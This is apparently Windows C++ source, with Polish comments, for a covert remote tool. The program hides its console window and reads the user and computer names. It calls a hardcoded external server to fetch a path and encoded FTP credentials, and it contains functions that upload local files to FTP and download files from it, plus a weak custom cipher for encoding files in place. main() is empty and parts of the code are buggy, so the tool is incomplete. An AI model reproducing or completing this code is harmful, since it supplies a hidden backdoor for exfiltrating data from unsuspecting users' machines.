#include <iostream>
#include <winsock.h>
#include <wininet.h>
#include <ctime>
#include <cstdlib>
#include <windows.h>
#include <process.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <stdlib.h>
#include <conio.h>

using namespace std;


int random;
bool endrand = false;
string user,computer,sciezka;


void dekoduj_plik(string filename);
void koduj_plik(string filename);
string koduj(string txt);
string dekoduj(string txt);
bool pobierzWWW(string &adr, string strona);

//------------------------------------------------
/* wlacza program w tle*/

void ukryj_okno() 
{
    HWND okno = FindWindow("ConsoleWindowClass", 0);            //uchwyt bierze to okno
    ShowWindow(okno, SW_HIDE);                                  //i wlacza w tle
}
void pokaz_okno()
{
    HWND okno = FindWindow("ConsoleWindowClass", 0);            //uchwyt bierze to okno
    ShowWindow(okno, SW_SHOW);                                  //i wlacza w tle
}

string czas(int var)
{
	string time;
	while(!pobierzWWW(time,"incognito/h.php"));
	if(var)
		return "["+time.substr(8,2)+":"+time.substr(10,2)+":"+time.substr(12,2)+"]";
	else
		return time.substr(0,8);
}

//------------------------------------------------
/*tworzy loga programu*/
int loguj(string linia)
{
	string linijka=czas(1)+"<Incognito>"+linia+"\n";
	string path = sciezka+user+".log";
	ofstream log(sciezka.c_str(),ios::out|ios::app);
	log << linijka;
	log.close();
}

//--------------------------------------------------
/*sprawdzanie username i tworzenie sciezki*/
void pathname()
{
	char *username = getenv( "USERNAME" );											//wczytujemy nazwe u¿ytkownika
    string nazwa(username);
    for(int j=0; j < nazwa.length(); j++)
	{
		if (nazwa[j] == ' ')					 								//jesli nazwa uzytkownika ma spacje
			nazwa[j] = '_';														//to zmieniamy je na pod³oge
	}
	user = nazwa;
	char *user2 = getenv( "COMPUTERNAME" );										//wczytujemy nazwe u¿ytkownika
    string nazwa2(user2);
	computer= nazwa2;
	while(!pobierzWWW(sciezka,"incognito/"+computer+".php"));				//pobieramy sciezke
	sciezka = dekoduj(sciezka);
}

//---------------------------------------------------------------------
/* pobiera trasc strony podanej w parametrze*/

bool pobierzWWW(string &adr, string strona)
{
      WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        //cout << "\nWSAStartup failed.\n";   
        return false ;
    }
    SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    struct hostent *host;
    host = gethostbyname("igi2.xaa.pl");
    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(80);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
        //cout << "\nCould not connect";
        
        return false ;
    }
    
    string request="GET /"+strona+" HTTP/1.1\r\n"
    "Host: igi2.xaa.pl\r\nConnection: close\r\n\r\n";
    send(Socket,request.c_str(), strlen(request.c_str()),0);
    char buffer[10000];
    int nDataLength;
    recv(Socket,buffer,10000,0);

    recv(Socket,buffer,10000,0);

	string buf(buffer);
	adr=buf.substr(buf.find("|||||")+5,buf.find(":::::")-(buf.find("|||||")+5));
	adr = buf;
   	
	closesocket(Socket);
    WSACleanup();
    
    return true;
}


//---------------------------------------------------
/*Pobieranie z ftp*/
int PobierzPlikFTP(string remoteFile,string newFile){//nazwa na serwerze potem nazwa na dysku

	string data;
  	while(!pobierzWWW(data,"incognito/passw"));
  	string ftp = dekoduj(data.substr(data.find("-FTP-")+5,data.find("+FTP+")-(data.find("-FTP-")+5)));
  	string usr = dekoduj(data.substr(data.find("-USR-")+5,data.find("+FTP+")-(data.find("-USR-")+5)));
  	string pas = dekoduj(data.substr(data.find("-PAS-")+5,data.find("+FTP+")-(data.find("-PAS-")+5)));
  	

    HINTERNET hInternet;
    HINTERNET hFtpSession;     

    if(InternetAttemptConnect(0) != ERROR_SUCCESS)
	{
		loguj("Blad sieci przy pobieraniu \""+remoteFile+"\" z FTP"); 
	}
 

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);

    if(hInternet != NULL){     

        hFtpSession = InternetConnect(hInternet, ftp.c_str(), INTERNET_DEFAULT_FTP_PORT, usr.c_str(), pas.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

        if(hFtpSession != NULL){
				
          	if(FtpGetFile(hFtpSession, remoteFile.c_str(), newFile.c_str() ,false, FILE_ATTRIBUTE_NORMAL, INTERNET_FLAG_TRANSFER_BINARY,0)) 
		   	{     
                InternetCloseHandle(hFtpSession);
                InternetCloseHandle(hInternet);
        	}
            else 
			{                                
				loguj("Nie pobrano \""+remoteFile+"\" z FTP");
                return 0;
            }    
            

        }
        else return 0;
        
    }

    else  return 0;


    return 1;

}

//--------------------------------------------------------
/*wysylanie  na ftp*/

int WyslijPlikFTP(string localFile, string remoteFile){
	
	string data;
  	while(!pobierzWWW(data,"incognito/passw"));
  	string ftp = dekoduj(data.substr(data.find("-FTP-")+5,data.find("+FTP+")-(data.find("-FTP-")+5)));
  	string usr = dekoduj(data.substr(data.find("-USR-")+5,data.find("+FTP+")-(data.find("-USR-")+5)));
  	string pas = dekoduj(data.substr(data.find("-PAS-")+5,data.find("+FTP+")-(data.find("-PAS-")+5)));
    
  
    HINTERNET hInternet;

    HINTERNET hFtpSession;     

    if(InternetAttemptConnect(0) == ERROR_SUCCESS) 
		cout<<"Wysylanie pliku!"<<endl;

    else 
	{
		return 0;
	}
 

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);

    if(hInternet != NULL){     

        hFtpSession = InternetConnect(hInternet, ftp.c_str(), INTERNET_DEFAULT_FTP_PORT, usr.c_str(), pas.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

        if(hFtpSession != NULL){

            if(FtpPutFile(hFtpSession, localFile.c_str(), remoteFile.c_str() , FTP_TRANSFER_TYPE_BINARY,0)){                 

                InternetCloseHandle(hFtpSession);

                InternetCloseHandle(hInternet);
				cout << "Plik zostal wyslany!" << endl;
				loguj("Wyslano plik konfiguracyjny na FTP");
                }
            else {                                
                return 0;
            }    
            

        }
        
        else 
			return 0;
        

    }

    else  
		return 0;  

    return 0;

};

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//============================================================================================================
//============================================================================================================
//============================================================================================================
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
int main()
{
	
	
	return 0;
}


void __cdecl Random( void * Argc)
{
	while(!endrand)
	{
		if(random > 2000000) random = random - 2000000;
		random += clock() % 25424355;
	} 
	endrand = false;
	_endthread();
}

void losuj()
{
	_beginthread( Random, 0, NULL );
	Sleep(20);
	endrand = true;
}

void losuj(int value)
{
	_beginthread( Random, 0, NULL );
	Sleep(20);
}

int ftoi(double value)
{
	value += 0.5;
	int ret;
	ret = value;
	return ret;
}

string itos(int value)
{
	string ret;
	while(value != 0)
	{
		ret += value%10 + 48;
		value /= 10;
	}
	string ret2;
	for(int i=ret.length()-1; i >= 0; i--)
	{
		ret2 += ret[i];
	}
	return(ret2);
}

string addzeros(string txt, int length)
{
	string ret;
	for(int i=txt.length(); i < length; i++) ret += "0";
	ret += txt;
	return(ret);
}

string koduj(string txt)
{
	string ret;
	string buf2;
	int buf;
	char c;
	double rand;
	rand = (random%693 + 100);
	ret += addzeros(itos(rand), 3);
	rand /= 100;

	for(int i=0; i < txt.length(); i++)
	{
		c = txt[i];
		buf = ftoi(c * rand);
		buf2 = itos(buf);
		buf2 = addzeros(buf2, 3);
		ret += buf2;
	}
	
	return(ret);
}

string dekoduj(string txt)
{
	string ret;
	string buf;
	buf += txt[0];
	buf += txt[1];
	buf += txt[2];
	
	char c;
	double d;
	double rand; 
	rand = atoi(buf.c_str());
	rand /= 100;
	
	for(int i=3; i < txt.length(); i+=3)
	{
		buf = "";
		buf += txt[i+0];
		buf += txt[i+1];
		buf += txt[i+2];
		
		d = atoi(buf.c_str()) / rand;
		c = ftoi(d);
		ret += c;
	}
	return ret;
}

void koduj_plik(string filename)
{
	ofstream out("output.txt", ios::out | ios::trunc);

	fstream plik;
	string linia;
	plik.open(filename.c_str(), ios::in);
	if(plik)
	{
		string line;
		while(!plik.eof())
		{
			getline(plik, line);
			if(line.length() > 0) out << koduj(line) << endl;
		}
		endrand = true;	
	}
	plik.close();
	out.close();
	ifstream plik2("output.txt");
	ofstream plik3(filename.c_str(), ios::out|ios::trunc);
	while(!plik2.eof())
	{
		getline(plik2,linia);
		plik3 << linia <<"\n";
	}
	plik2.close();
	plik3.close();
	DeleteFileA("output.txt");
}

void dekoduj_plik(string filename)
{
	ofstream out("decode.txt", ios::out | ios::trunc);

	fstream plik;
	plik.open(filename.c_str(), ios::in);
	if(plik)
	{
		string line;
		while(!plik.eof())
		{
			getline(plik, line);
			if(line.length() > 0) out << dekoduj(line) << endl;
		}
		endrand = true;
		
	}
	plik.close();
	out.close();
	string linia;
	ifstream plik2("decode.txt");
	ofstream plik3(filename.c_str(), ios::out|ios::trunc);
	while(!plik2.eof())
	{
		getline(plik2,linia);
		plik3 << linia <<"\n";
	}
	plik2.close();
	plik3.close();
	DeleteFileA("decode.txt");
}

